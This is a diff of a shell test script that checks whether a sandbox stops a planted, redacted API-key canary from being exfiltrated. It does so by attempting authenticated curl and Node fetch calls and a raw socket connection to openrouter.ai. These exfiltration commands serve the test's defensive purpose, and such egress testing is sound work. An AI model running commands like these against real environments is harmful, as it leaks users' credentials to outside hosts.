@@ -42,7 +42,7 @@ curl -fsS --max-time 10 "http://127.0.0.1:${praxis_port}/v1/models" >"${td}/mode
 echo "gateway is up on 127.0.0.1:${praxis_port}"
 
 say "Act 1: create the sandbox (integrated profile, no provider binding)"
-sed "s#@@PRAXIS_PORT@@#${praxis_port}#g" \
+sed -e "s#@@PRAXIS_PORT@@#${praxis_port}#g" -e "s#@@PRAXIS_API_PREFIX@@##g" \
   "${ROOT}/configs/openshell-praxis/profiles/dev/policy.yaml" >"${td}/policy.yaml"
 harness_create "${name}" "${ODH_OPENCODE_IMAGE}" "${td}/policy.yaml"
 harness_ssh "${name}" 'test -x /usr/bin/node-26' \
@@ -59,18 +59,27 @@ harness_ssh "${name}" 'source ~/.bashrc; env | grep -i openrouter | sed "s/=.*/=
 grep -q "OPENROUTER_API_KEY=<value redacted>" "${td}/recon.out" \
   || die "planted canary not visible in the sandbox environment"
 
-say "Act 3: the exfiltration attempt, vector 1 - curl"
-# shellcheck disable=SC2016  # the bearer variable must expand inside the sandbox
-if harness_ssh "${name}" 'source ~/.bashrc; curl -sS --max-time 10 \
-    -H "Authorization: Bearer ${OPENROUTER_API_KEY}" \
-    -H "Content-Type: application/json" \
-    -d "{\"model\":\"deepseek/deepseek-v4.1-flash\",\"messages\":[{\"role\":\"user\",\"content\":\"hello\"}],\"max_tokens\":4}" \
-    https://openrouter.ai/api/v1/chat/completions' 2>"${td}/curl.err"; then
-  die "SECURITY FAILURE: curl reached openrouter.ai from inside the sandbox"
+say "Act 3.1: the exfiltration attempt, vector 1 - the reported move, an authenticated API call"
+# The reported move: spend the key on a provider API call. The shell has
+# no curl at all (the image ships only what the workload needs), so the
+# only HTTP client left is the sanctioned runtime itself - and the
+# request dies at connect(), the key never transmitted.
+if printf '%s\n' \
+  'const key = process.env.OPENROUTER_API_KEY;' \
+  'const body = JSON.stringify({model: "deepseek/deepseek-v4.1-flash", messages: [{role: "user", content: "hello"}], max_tokens: 4});' \
+  'fetch("https://openrouter.ai/api/v1/chat/completions", {' \
+  '  method: "POST",' \
+  '  headers: {"Authorization": "Bearer " + key, "Content-Type": "application/json"},' \
+  '  body,' \
+  '})' \
+  '  .then(async (r) => { console.log("UNEXPECTED: HTTP", r.status); process.exit(0); })' \
+  '  .catch((e) => { console.log("request error:", e.cause?.code ?? e.message); process.exit(1); });' \
+  | harness_ssh "${name}" 'source ~/.bashrc; /usr/bin/node-26' >"${td}/vector1.out" 2>&1; then
+  die "SECURITY FAILURE: the authenticated request reached openrouter.ai from inside the sandbox"
 fi
-echo "denied:"; cat "${td}/curl.err"
+echo "denied:"; cat "${td}/vector1.out"
 
-say "Act 3: the exfiltration attempt, vector 2 - the sanctioned runtime, wrong endpoint"
+say "Act 3.2: the exfiltration attempt, vector 2 - the sanctioned runtime, wrong endpoint"
 if printf '%s\n' \
   'const net = require("net");' \
   'const s = net.connect({host: "openrouter.ai", port: 443});' \
